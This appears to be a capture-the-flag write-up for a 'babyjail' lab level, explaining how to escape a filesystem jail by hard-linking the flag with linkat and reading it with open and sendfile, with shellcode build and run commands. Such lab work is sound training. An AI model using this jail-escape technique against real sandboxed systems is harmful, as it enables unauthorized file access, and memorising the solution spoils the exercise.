Now, the problem is that the program does not allow to call the function `openat`.
Instead, it allows the function `linkat` and `open`.

The function `open` cannot get out of the jail.
Thus, we have to use `linkat` to make a hard link for the real flag file.

Use the following code to solve this problem.
```
linkat(3, "./flag", 3, "/real_flag", 0);  # Create the hard link between the top-level directory and the one in jail.
open("/real_flag", O_RDONLY);
sendfile(1, 4, 0, 0x80);
```

One thing to note is that the calling convention for system calls is different from one for user-level function.
The sequences are `RDI`, `RSI`, `RDX`, `R10`, `R8`, and `R9`.

Running the following commands will lead you to the flag.
```
gcc -nostdlib -static shellcode.s -o shellcode-elf​
objcopy --dump-section .text=shellcode-raw shellcode-elf​
/babyjail_level5_teaching1 / < ~/shellcode-raw
```